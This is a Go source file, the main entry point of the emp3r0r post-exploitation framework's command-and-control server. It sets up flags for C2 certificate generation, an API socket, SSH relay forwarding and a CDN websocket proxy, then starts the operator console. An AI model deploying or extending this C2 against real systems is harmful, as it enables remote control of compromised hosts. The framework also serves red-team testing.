//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/core"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/tools"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

var Logger *logging.Logger

// Options struct to hold flag values
type Options struct {
	cdnProxy         string
	config           string
	names            string
	apiServer        bool
	sshRelayPort     string
	connectRelayAddr string
	relayedPort      int
	debug            bool
}

func parseFlags() *Options {
	opts := &Options{}
	flag.StringVar(&opts.cdnProxy, "cdn2proxy", "", "Start cdn2proxy server on this port")
	flag.StringVar(&opts.names, "gencert", "", "Generate C2 server cert with these host names")
	flag.BoolVar(&opts.apiServer, "api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
	flag.StringVar(&opts.sshRelayPort, "relay_server", "", "Act as SSH remote forwarding relay on this port")
	flag.StringVar(&opts.connectRelayAddr, "connect_relay", "", "Connect to SSH remote forwarding relay (host:port)")
	flag.IntVar(&opts.relayedPort, "relayed_port", 0, "Relayed port, use with -connect_relay")
	flag.BoolVar(&opts.debug, "debug", false, "Do not kill tmux session when crashing, so you can see the crash log")
	flag.Parse()
	return opts
}

func init() {
	// set up dirs and default varaibles
	// including config file location
	err := def.InitCC()
	if err != nil {
		log.Fatalf("C2 file paths setup: %v", err)
	}

	// set up logger
	Logger, err = logging.NewLogger(def.EmpLogFile, 2)
	if err != nil {
		log.Fatalf("cc: failed to set up logger: %v", err)
	}

	// read config file
	err = def.ReadJSONConfig()
	if err != nil {
		Logger.Fatal("Failed to read config: %v", err)
	}

	// set up magic string
	def.InitMagicAgentOneTimeBytes()
}

func main() {
	// Parse command-line flags
	opts := parseFlags()

	// do not kill tmux session when crashing
	if opts.debug {
		def.TmuxPersistence = true
	}

	// abort if CC is already running
	if tools.IsCCRunning() {
		Logger.Fatal("CC is already running")
	}

	// Run as SSH relay client if requested
	if opts.connectRelayAddr != "" {
		if opts.relayedPort == 0 {
			Logger.Fatal("Please specify -relayed_port")
		}
		runSSHRelayClient(opts)
	}

	// Start cdn2proxy server if specified
	if opts.cdnProxy != "" {
		startCDN2Proxy(opts)
	}

	// Run as SSH relay server if specified; otherwise run CLI
	if opts.sshRelayPort != "" {
		runSSHRelayServer(opts)
	} else {
		core.CliMain()
	}
}

// handle SSH relay client logic
func runSSHRelayClient(opts *Options) {
	sshPassword := new(string)
	fmt.Printf("Enter SSH password: ")
	fmt.Scanln(sshPassword)
	go func(pass string) {
		defer Logger.Error("session unexpectedly exited, please restart emp3r0r")
		SSHConnections := make(map[string]context.CancelFunc, 10)
		pubkey, sshKeyErr := tun.SSHPublicKey(def.RuntimeConfig.SSHHostKey)
		if sshKeyErr != nil {
			Logger.Fatal("Parsing SSHPublicKey: %v", sshKeyErr)
		}
	ssh_connect:
		ctx, cancel := context.WithCancel(context.Background())
		sshKeyErr = tun.SSHRemoteFwdClient(opts.connectRelayAddr,
			pass,
			pubkey, // enable host key verification
			opts.relayedPort,
			&SSHConnections, ctx, cancel)
		if sshKeyErr == nil {
			sshKeyErr = fmt.Errorf("session unexpectedly exited")
			Logger.Warning("SSHRemoteFwdClient: %v, retrying", sshKeyErr)
		}
		for ctx.Err() == nil {
			util.TakeABlink()
		}
		goto ssh_connect
	}(*sshPassword)
}

// handle SSH relay server logic
func runSSHRelayServer(opts *Options) {
	sshPassword := util.RandMD5String()
	log.Printf("SSH password is %s. Copy ~/.emp3r0r to client host, "+
		"then run `emp3r0r -connect_relay relay_ip:%s -relayed_port %s` "+
		"(C2 port, or KCP port %s if you are using it)",
		strconv.Quote(sshPassword), opts.sshRelayPort, def.RuntimeConfig.CCPort, def.RuntimeConfig.KCPServerPort)
	if err := tun.SSHRemoteFwdServer(opts.sshRelayPort,
		sshPassword,
		def.RuntimeConfig.SSHHostKey); err != nil {
		log.Fatalf("SSHRemoteFwdServer: %v", err)
	}
}

// helper function to start the cdn2proxy server
func startCDN2Proxy(opts *Options) {
	go func() {
		logFile, openErr := os.OpenFile("/tmp/ws.log", os.O_CREATE|os.O_RDWR, 0o600)
		if openErr != nil {
			Logger.Fatal("OpenFile: %v", openErr)
		}
		openErr = cdn2proxy.StartServer(opts.cdnProxy, "127.0.0.1:"+def.RuntimeConfig.CCPort, "ws", logFile)
		if openErr != nil {
			Logger.Fatal("CDN StartServer: %v", openErr)
		}
	}()
}
